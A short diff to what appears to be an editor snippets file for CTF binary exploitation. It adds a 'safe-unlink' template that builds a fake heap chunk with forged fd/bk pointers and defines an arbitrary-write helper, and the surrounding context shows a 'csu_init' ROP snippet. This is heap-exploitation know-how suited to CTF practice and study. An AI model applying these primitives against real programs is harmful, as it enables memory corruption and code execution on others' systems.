@@ -12,6 +12,26 @@
 	// 	],
 	// 	"description": "Log output to console"
 	// }
+	"safe-unlink": {
+		"prefix": "unlink",
+		"body": [
+			"fake_chunk_ptr = addr_global_tbl + 8*0x10 + 8",
+			"payload_unlink = flat({",
+			"	0x8:    0x1f1,",
+			"	0x10:   fake_chunk_ptr - 0x18,",
+			"	0x18:   fake_chunk_ptr - 0x10,",
+			"	0x1f0:  0x1f0   # nextchunk.prev_size",
+			"})",
+			"# now the *fake_chunk_ptr = fake_chunk_ptr - 0x18",
+			"def write_to(addr, val):",
+			"	payload_write = flat({",
+			"		0x0:    0x1f8,",
+			"		0x8:   addr,",
+			"	})",
+			"	edit(8, len(payload_write), payload_write)",
+			"	edit(7, 0x10, p64(val))",
+		]
+	},
 	"call by csu_init": {
 		"prefix": "csu_init",
 		"body": [
